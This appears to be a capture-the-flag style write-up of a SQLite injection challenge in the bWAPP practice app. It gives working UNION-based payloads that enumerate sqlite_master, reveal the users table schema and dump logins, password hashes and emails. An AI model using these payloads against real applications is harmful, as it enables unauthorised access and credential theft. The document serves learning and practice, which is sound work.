## First Trial:

First thing, I tried entering a single quote to see the error that will be returned. The error was not any of the errors that I have encountered before. This error was as follows:

> Error: HY000

After searching this error, I understood that this is a syntax error, which means that the syntax for SQLite is different from MySQL.

## Second Trial:

Second thing I thought of was entering a double qoute, and indeed it did not give an error instead it gave me this response:

> No movies were found!

Thus we have managed to know that tha double quote is the right syntax for the SQLite 

I then tried entering the following payload and each time changing the limit of the last column number:

```SQLite
'union select 1,2,sqlite_version(),4,5,6-- -
```

And fortunately, by trial and error I arrived at a table that has the version of the SQLite used which was 3.4.2 .

Then I tried searching for the equivalent of information_schema in SQLite and found that we can use the `sqlite_master` table to get information about tables and views.

So, we can use the following line to gaet table names:

```SQLite
' union select 1,name,3,4,5,6 from sqlite_master-- -
```

We get a table that has some table names one of them is the users table, which we can then use to get some sensitive information.

Before we go to the next step, we must know what does the sql column in the sqlite_master table holds. The sql column  in the `sqlite_master` table contains the SQL statement that was used to create the object.
Which means that if we manage to get it we will know the names of the columns in the users table. The `sql` column in the `sqlite_master` table contains the SQL statement that was used to create the object.

We can do that using this line:

```SQLite
' union select 1,2,sql,4,5,6 from sqlite_master-- -
```

We will get a table which has a row for each table's information. The information we were able to retrieve about the users tables were as follows:

> CREATE TABLE "users" ( "id" int(10) NOT NULL , "login" varchar(100) DEFAULT NULL, "password" varchar(100) DEFAULT NULL, "email" varchar(100) DEFAULT NULL, "secret" varchar(100) DEFAULT NULL, "activation_code" varchar(100) DEFAULT NULL, "activated" tinyint(1) DEFAULT '0', "reset_code" varchar(100) DEFAULT NULL, "admin" tinyint(1) DEFAULT '0', PRIMARY KEY ("id") )

This is the DDL statement which was used to create the table and as we can see we have the following columns in this table:

+ id
+ login
+ password
+ email
+ secret
+ activation_code
+ activated
+ reset_code
+ admin

We can then dig up the login, password and email columns and get the users' information using the following line:

```SQLite
' union select 1,2,login,password,email,6 from users -- -
```

And we will get the following pieces of information:

> A.I.M.      bwapp-aim@mailinator.com   6885858486f31043e5839c735d99457f045affd0
> bee         bwapp-bee@mailinator.com 6885858486f31043e5839c735d99457f045affd0

Thus we have managed to pass this challenge.
